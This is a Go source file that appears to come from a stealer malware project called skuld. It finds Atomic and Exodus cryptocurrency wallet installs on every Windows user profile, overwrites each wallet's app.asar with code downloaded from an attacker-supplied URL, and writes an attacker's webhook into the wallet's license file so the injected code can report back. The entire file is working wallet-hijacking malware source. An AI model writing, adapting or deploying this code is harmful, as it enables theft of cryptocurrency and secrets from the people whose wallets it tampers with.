package walletsinjection

import (
	"io"
	"net/http"
	"os"
	"path/filepath"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
)

func Run(atomic_injection_url, exodus_injection_url, webhook string) {
	AtomicInjection(atomic_injection_url, webhook)
	ExodusInjection(exodus_injection_url, webhook)
}

func AtomicInjection(atomic_injection_url, webhook string) {
	for _, user := range hardware.GetUsers() {
		atomicPath := filepath.Join(user, "AppData", "Local", "Programs", "atomic")
		if !fileutil.IsDir(atomicPath) {
			continue
		}

		atomicAsarPath := filepath.Join(atomicPath, "resources", "app.asar")
		atomicLicensePath := filepath.Join(atomicPath, "LICENSE.electron.txt")

		if !fileutil.Exists(atomicAsarPath) {
			continue
		}

		Injection(atomicAsarPath, atomicLicensePath, atomic_injection_url, webhook)
	}
}

func ExodusInjection(exodus_injection_url, webhook string) {
	for _, user := range hardware.GetUsers() {
		exodusPath := filepath.Join(user, "AppData", "Local", "exodus")
		if !fileutil.IsDir(exodusPath) {
			continue
		}

		files, err := filepath.Glob(filepath.Join(exodusPath, "app-*"))
		if err != nil {
			continue
		}

		if len(files) == 0 {
			continue
		}

		exodusPath = files[0]

		exodusAsarPath := filepath.Join(exodusPath, "resources", "app.asar")
		exodusLicensePath := filepath.Join(exodusPath, "LICENSE")

		if !fileutil.Exists(exodusAsarPath) {
			continue
		}

		Injection(exodusAsarPath, exodusLicensePath, exodus_injection_url, webhook)
	}
}

func Injection(path, licensePath, injection_url, webhook string) {
	if !fileutil.Exists(path) {
		return
	}

	resp, err := http.Get(injection_url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	out, err := os.Create(path)
	if err != nil {
		return
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return
	}

	license, err := os.Create(licensePath)
	if err != nil {
		return
	}
	defer license.Close()

	license.WriteString(webhook)
}
